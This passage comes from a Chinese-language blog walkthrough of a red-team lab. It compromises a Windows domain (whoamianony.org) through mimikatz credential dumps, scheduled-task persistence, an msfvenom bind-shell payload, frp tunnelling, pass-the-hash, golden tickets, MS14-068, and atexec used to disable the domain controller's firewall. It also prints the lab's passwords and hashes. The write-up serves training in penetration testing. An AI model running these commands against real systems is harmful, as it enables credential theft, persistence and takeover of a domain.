3e6a3d8c713b4821eaa51aab25f52074</span><br><span class="line">         * SHA1     : d8e1318a24c64b8fcc89dc8609b09af50342bacf</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : pc1$</span><br><span class="line">         * Domain   : whoamianony.org</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 50236 (00000000:0000c43c)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:09</span><br><span class="line">SID               : </span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * NTLM     : 3e6a3d8c713b4821eaa51aab25f52074</span><br><span class="line">         * SHA1     : d8e1318a24c64b8fcc89dc8609b09af50342bacf</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : PC1$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:09</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : pc1$</span><br><span class="line">         * Domain   : WHOAMIANONY.ORG</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br></pre></td></tr></table></figure><h2 id="权限维持"><a class="markdownIt-Anchor" href="#权限维持"></a> 权限维持</h2><p>使用任务：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721141149902.png" alt="image-20230721141149902" /></p><p>使用定时任务（<a href="https://blog.csdn.net/weixin_45677145/article/details/122061271">at / schtasks</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN sysRev2 /SC DAILY /ST 10:02 /TR C:\Windows\Temp\4706.exe /RL HIGHEST</span><br><span class="line"># 五分钟一次</span><br><span class="line">schtasks /create /sc minute /mo 5 /tn &quot;sysRev2&quot; /tr C:\Windows\Temp\4706.exe</span><br></pre></td></tr></table></figure><h2 id="横向"><a class="markdownIt-Anchor" href="#横向"></a> 横向</h2><p>因为尝试过对PC2和DC进行永恒之蓝攻击，没用，所以横向吧，哈哈哈哈。搜集到的信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Username : Administrator</span><br><span class="line">Domain   : WHOAMIANONY</span><br><span class="line">NTLM     : ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line">Password : Whoami2021</span><br><span class="line"></span><br><span class="line">#其他IP</span><br><span class="line">192.168.93.30 （DC）</span><br><span class="line">192.168.93.40</span><br><span class="line"></span><br><span class="line">#DNS</span><br><span class="line">whoamianony.org</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试ipc连接一下，这里竟然明文传递就可以了，行吧～</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.40\ipc$ &quot;Whoami2021&quot; /user:whoamianony.org\Administrator</span><br><span class="line">net use \\192.168.93.30\ipc$ &quot;Whoami2021&quot; /user:whoamianony.org\Administrator</span><br><span class="line"></span><br><span class="line">C:\Windows\Temp&gt;net use</span><br><span class="line">\192.168.93.30\ipc$      Microsoft Windows Network</span><br><span class="line">\\192.168.93.40\ipc$      Microsoft Windows Network</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721150954348.png" alt="image-20230721150954348" /></p><p>成功了。然后传个frp进去，准备打DC（虽然可以直接拿下，但是还是模拟一下三层吧）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy frpc.exe \\192.168.93.40\admin$</span><br><span class="line">copy frpc2.ini \\192.168.93.40\admin$</span><br><span class="line">copy frp.bat \\192.168.93.40\admin$</span><br><span class="line"></span><br><span class="line">at \\192.168.93.40 15:51 frp.bat </span><br><span class="line">at \\192.168.93.40 17:06 PC2.exe</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721152615512.png" alt="image-20230721152615512" /></p><p>传进去了，然后在我们的web2开启frps。添加proxychain</p><blockquote><p>具体的操作是，先搭好第一个隧道，然后默认配置移位到内网中，只是改一下frpc中的ip即可，其他都不用改</p></blockquote><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721162737931.png" alt="image-20230721162737931" /></p><p>可以看到，设置成功（虽然，其实，我们用不到，但不能没有！）</p><p>现在设置正向连接，传一个马进去，然后我们主机连他（因为它连不出来）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=4801 -f exe -o /home/j3fffff/Template/4801.exe</span><br><span class="line">copy 4801.bat \\192.168.93.40\admin$</span><br><span class="line">schtasks /Create /s 192.168.93.40 /TN sysRev2 /SC MINUTE /ST 11:05 /TR C:\Windows\4801.exe #用at或者impacket也行，后面有说道，运行后再加上服务也OK</span><br></pre></td></tr></table></figure><h1 id="pc2"><a class="markdownIt-Anchor" href="#pc2"></a> PC2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">Host Name:                 PC2</span><br><span class="line">OS Name:                   Microsoft Windows 7 专业版 </span><br><span class="line">OS Version:                6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Member Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows 用户</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00371-177-0000061-85693</span><br><span class="line">Original Install Date:     2019/8/25, 9:54:10</span><br><span class="line">System Boot Time:          2023/7/26, 15:29:23</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware Virtual Platform</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 25 Model 116 Stepping 1 AuthenticAMD ~3792 Mhz</span><br><span class="line">BIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume1</span><br><span class="line">System Locale:             zh-cn;Chinese (China)</span><br><span class="line">Input Locale:              zh-cn;Chinese (China)</span><br><span class="line">Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi</span><br><span class="line">Total Physical Memory:     2,047 MB</span><br><span class="line">Available Physical Memory: 1,267 MB</span><br><span class="line">Virtual Memory: Max Size:  4,095 MB</span><br><span class="line">Virtual Memory: Available: 3,236 MB</span><br><span class="line">Virtual Memory: In Use:    859 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    whoamianony.org</span><br><span class="line">Logon Server:              \\DC</span><br><span class="line">Hotfix(s):                 4 Hotfix(s) Installed.</span><br><span class="line">                           [01]: KB2534111</span><br><span class="line">                           [02]: KB2999226</span><br><span class="line">                           [03]: KB958488</span><br><span class="line">                           [04]: KB976902</span><br><span class="line">Network Card(s):           4 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                                 Connection Name: 本地连接</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 192.168.93.40</span><br><span class="line">                                 [02]: fe80::31c7:aebb:d3a:2483</span><br><span class="line">                           [02]: Bluetooth 设备(个人区域网)</span><br><span class="line">                                 Connection Name: Bluetooth 网络连接</span><br><span class="line">                                 Status:          Media disconnected</span><br><span class="line">                           [03]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                                 Connection Name: 本地连接 2</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     10.10.10.255</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.2</span><br><span class="line">                                 [02]: fe80::dc73:8b1c:8bf8:4e13</span><br><span class="line">                           [04]: Microsoft Loopback Adapter</span><br><span class="line">                                 Connection Name: Npcap Loopback Adapter</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     255.255.255.255</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 169.254.129.186</span><br><span class="line">                                 [02]: fe80::b461:ccad:e30f:81ba</span><br></pre></td></tr></table></figure><p>然而想要提权，烂土豆用不了，没有模拟权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                          State   </span><br><span class="line">============================= ==================================== ========</span><br><span class="line">SeShutdownPrivilege           Shut down the system                 Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled </span><br><span class="line">SeUndockPrivilege             Remove computer from docking station Disabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</span><br><span class="line">SeTimeZonePrivilege           Change the time zone                 Disabled</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用CVE-2018-8120提权（然后设置payload为bind_tcp即可）：</p><p>使用模块：<code>post/multi/recon/local_exploit_suggester</code>，它会提示哪些可以用</p><p>权限维持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN sysRev2 /SC MINUTE /ST 11:01 /TR C:\Windows\4801.exe /RL HIGHEST</span><br></pre></td></tr></table></figure><p>搜集信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::wdigest</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1456947 (00000000:00163b33)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : moretz</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2023/7/26 15:29:48</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-1115</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : moretz</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Moretz2021</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : PC2$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC2$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : e5 5c e8 ea be 6d c9 1e e7 9e 5d 3a 6b d1 22 31 21 48 2f a1 4f 52 7e a4 e8 d0 19 80 48 22 97 95 73 4a be 03 c2 d4 5c 66 3c 72 eb 8c b3 2e 9e 81 a1 d3 a3 c3 31 22 c9 36 15 28 3f 1d 2a e3 cc 7d 5b 9b 60 1a c7 51 36 8c c8 25 e8 92 62 4f 58 b3 7f ef 03 98 b6 2a 70 41 ec b3 5a 89 6d 0e da e2 38 4f cb 21 9a ce 76 1a 0e 72 0e 62 0d 4c 7e 44 ce d1 9f e2 41 07 d5 77 f1 74 28 a6 58 3b 41 10 df 25 b2 00 3d fc 6d 2e 1d 5b 65 00 a3 7c 3d 47 91 43 0a 6c d8 bb 09 d7 d8 82 27 36 cb cb b3 a6 b9 db 68 cd 07 9a bb d4 50 c1 8b 5f 24 ee c4 a7 d9 66 51 8a 7d 19 74 b1 1b 9e fe 4d 6f b8 fc e1 85 28 6e b2 b2 dd aa a7 7d ad 2b 86 b7 9a d7 be e5 db e9 07 d1 28 ae 29 96 28 2b 66 ee 57 ea fb 7f db ab e5 3a 37 4b 26 06 6e 3c fa 14 49 cd 73 </span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 49813 (00000000:0000c295)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : </span><br><span class="line">        wdigest :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : PC2$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC2$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : e5 5c e8 ea be 6d c9 1e e7 9e 5d 3a 6b d1 22 31 21 48 2f a1 4f 52 7e a4 e8 d0 19 80 48 22 97 95 73 4a be 03 c2 d4 5c 66 3c 72 eb 8c b3 2e 9e 81 a1 d3 a3 c3 31 22 c9 36 15 28 3f 1d 2a e3 cc 7d 5b 9b 60 1a c7 51 36 8c c8 25 e8 92 62 4f 58 b3 7f ef 03 98 b6 2a 70 41 ec b3 5a 89 6d 0e da e2 38 4f cb 21 9a ce 76 1a 0e 72 0e 62 0d 4c 7e 44 ce d1 9f e2 41 07 d5 77 f1 74 28 a6 58 3b 41 10 df 25 b2 00 3d fc 6d 2e 1d 5b 65 00 a3 7c 3d 47 91 43 0a 6c d8 bb 09 d7 d8 82 27 36 cb cb b3 a6 b9 db 68 cd 07 9a bb d4 50 c1 8b 5f 24 ee c4 a7 d9 66 51 8a 7d 19 74 b1 1b 9e fe 4d 6f b8 fc e1 85 28 6e b2 b2 dd aa a7 7d ad 2b 86 b7 9a d7 be e5 db e9 07 d1 28 ae 29 96 28 2b 66 ee 57 ea fb 7f db ab e5 3a 37 4b 26 06 6e 3c fa 14 49 cd 73</span><br><span class="line">         </span><br><span class="line">                  [00000003] Primary</span><br><span class="line">         * Username : PC2$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * NTLM     : 803959d82b51f5761137db87ef1aa382</span><br><span class="line">         * SHA1     : bc43c01c03781bc2883789571f720c1f858b1453</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="域横向"><a class="markdownIt-Anchor" href="#域横向"></a> 域横向</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:WHOAMIANONY /ntlm:ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line"></span><br><span class="line">#黄金票据</span><br><span class="line">mimikatz.exe kerberos::golden /admin:administrator /domain:WHOAMIANONY.org /sid:S-1-5-21-1315137663-3706837544-1429009142-1115 /krbtgt:ab89b1295e69d353dd7614c7a3a80cec /ticket:gold.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.\MS14-068.exe -u moretz@WHOAMIANONY.org -s S-1-5-21-1315137663-3706837544-1429009142-1115 -d 192.168.93.40 -p Moretz2021</span><br><span class="line"></span><br><span class="line">#先使用IPC传文件，当然也可以用impacket了</span><br><span class="line">schtasks /Create /s 192.168.93.30 /TN sysRev5 /SC MINUTE /ST 11:05 /TR C:\Windows\4802.exe #这次行不通了</span><br><span class="line">atexec.exe -hashes &quot;:ab89b1295e69d353dd7614c7a3a80cec&quot; Administrator@192.168.93.30 &quot;c:\\Windows\\4803.exe&quot; #需要先关掉防火墙后，我们才能bind进来</span><br><span class="line">atexec.exe -hashes &quot;:ab89b1295e69d353dd7614c7a3a80cec&quot; Administrator@192.168.93.30 &quot;NetSh Advfirewall set allprofiles state off&quot;</span><br></pre></td></tr></table></figure><h1 id="dc域控"><a class="markdownIt-Anchor" href="#dc域控"></a> DC域控</h1><p>对于横向，无非就几种方法，明文传递（IPC）/哈希传递/票据传递，然后就是约束与非约束委派，再来就是exchange，而执行命令可以使用计划任务执行，也可以使用impacket执行，psexec/smb/wmi执行等。而获取域控的方法有：</p><ul><li>金银票据</li><li>MS14-068</li><li>SYSVOL</li></ul><h2 id="spn"><a class="markdownIt-Anchor" href="#spn"></a> SPN</h2><p>先使用SPN扫一下有什么服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># 在任何域机器中执行（需要system权限）</span><br><span class="line">setspn -T WHOAMIANONY.org -Q */*</span><br><span class="line">Checking domain DC=whoamianony,DC=org</span><br><span class="line">CN=DC,OU=Domain Controllers,DC=whoamianony,DC=org</span><br><span class="line">        TERMSRV/DC</span><br><span class="line">        TERMSRV/DC.whoamianony.org</span><br><span class="line">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/ForestDnsZones.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/DomainDnsZones.whoamianony.org</span><br><span class="line">        DNS/DC.whoamianony.org</span><br><span class="line">        GC/DC.whoamianony.org/whoamianony.org</span><br><span class="line">        RestrictedKrbHost/DC.whoamianony.org</span><br><span class="line">        RestrictedKrbHost/DC</span><br><span class="line">        RPC/01982af1-1153-4ddc-b024-9a35fd66b0af._msdcs.whoamianony.org</span><br><span class="line">        HOST/DC/WHOAMIANONY</span><br><span class="line">        HOST/DC.whoamianony.org/WHOAMIANONY</span><br><span class="line">        HOST/DC</span><br><span class="line">        HOST/DC.whoamianony.org</span><br><span class="line">        HOST/DC.whoamianony.org/whoamianony.org</span><br><span class="line">        E3514235-4B06-11D1-AB04-00C04FC2DCD2/01982af1-1153-4ddc-b024-9a35fd66b0af/whoamianony.org</span><br><span class="line">        ldap/DC/WHOAMIANONY</span><br><span class="line">        ldap/01982af1-1153-4ddc-b024-9a35fd66b0af._msdcs.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/WHOAMIANONY</span><br><span class="line">        ldap/DC</span><br><span class="line">        ldap/DC.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/whoamianony.org</span><br><span class="line">CN=krbtgt,CN=Users,DC=whoamianony,DC=org</span><br><span class="line">        kadmin/changepw</span><br><span class="line">CN=PC2,CN=Computers,DC=whoamianony,DC=org</span><br><span class="line">        TERMSRV/PC2</span><br><span class="line">        TERMSRV/PC2.whoamianony.org</span><br><span class="line">        RestrictedKrbHost/PC2.whoamianony.org</span><br><span class="line">        HOST/PC2.whoamianony.org</span><br><span class="line">        RestrictedKrbHost/PC2</span><br><span class="line">        HOST/PC2</span><br><span class="line"></span><br><span class="line">Existing SPN found!</span><br></pre></td></tr></table></figure><h2 id="pth"><a class="markdownIt-Anchor" href="#pth"></a> PTH</h2><p>使用mimikatz的pth会生成一个窗口，不太好用，如果密码错误，则这个窗口也不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:administrator /domain:WHOAMIANONY /ntlm:ab89b1295e69d353dd7614c7a3a80cec</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727144550596.png" alt="image-20230727144550596" /></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/9fa2405ea218d96cef3e6995b578ebb5.jpg" alt="9fa2405ea218d96cef3e6995b578ebb5" /></p><p>其他还有psexec等等的哈希传递，挺好用的</p><h2 id="金银票据与ms14-068以pc2进行与ptk"><a class="markdownIt-Anchor" href="#金银票据与ms14-068以pc2进行与ptk"></a> 金/银票据与MS14-068（以PC2进行）与PTK</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-500</span><br><span class="line">* Username : Administrator</span><br><span class="line">* Domain   : WHOAMIANONY.ORG</span><br><span class="line">* Password : Whoami2021</span><br><span class="line">* NTLM     : ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line"></span><br><span class="line">* Username : bunny</span><br><span class="line">* Domain   : WHOAMIANONY.ORG</span><br><span class="line">* NTLM     : cc567d5556030b7356ee4915ff098c8f</span><br><span class="line">* Password : Bunny2021</span><br><span class="line"></span><br><span class="line">域控IP：192.168.93.30</span><br><span class="line">本机IP：192.168.93.20</span><br></pre></td></tr></table></figure><p>流程：<a href="https://www.heresecurity.wiki/heng-xiang-yi-dong/pass-the-ticket">https://www.heresecurity.wiki/heng-xiang-yi-dong/pass-the-ticket</a></p><ol><li><p>清空凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe </span><br><span class="line">privilege::debug</span><br><span class="line">kerberos::list //查看当前机器凭证</span><br><span class="line">kerberos::purge//清空当前机器中所有凭证</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li><li><p>制作金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 